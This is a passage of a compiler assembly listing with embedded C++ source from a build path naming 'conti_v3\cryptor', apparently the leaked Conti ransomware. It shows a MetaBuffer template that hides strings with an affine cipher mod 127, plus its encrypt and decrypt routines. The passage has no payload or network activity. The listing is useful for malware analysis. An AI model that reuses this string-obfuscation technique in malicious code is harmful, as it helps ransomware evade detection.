??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 34	 sub	 eax, 52			; 00000034H
  0002d	6b c0 d4	 imul	 eax, eax, -44		; ffffffffffffffd4H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 65	 imul	 eax, eax, 101		; 00000065H
  0002d	83 c0 34	 add	 eax, 52			; 00000034H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 06	 cmp	 QWORD PTR i$1[rbp], 6
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ PROC ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ENDP ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv140 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00131	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00135	88 85 c0 00 00
	00		 mov	 BYTE PTR tv140[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0013b	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00142	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00149	5f		 pop	 rdi
  0014a	5d		 pop	 rbp
  0014b	c3		 ret	 0
??0?$MetaBuffer@$0GF@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<101,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 1d	 sub	 eax, 29
  0002d	6b c0 e9	 imul	 eax, eax, -23
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 0b	 imul	 eax, eax, 11
  0002d	83 c0 1d	 add	 eax, 29
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 24	 cmp	 QWORD PTR i$1[rbp], 36	; 00000024H
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
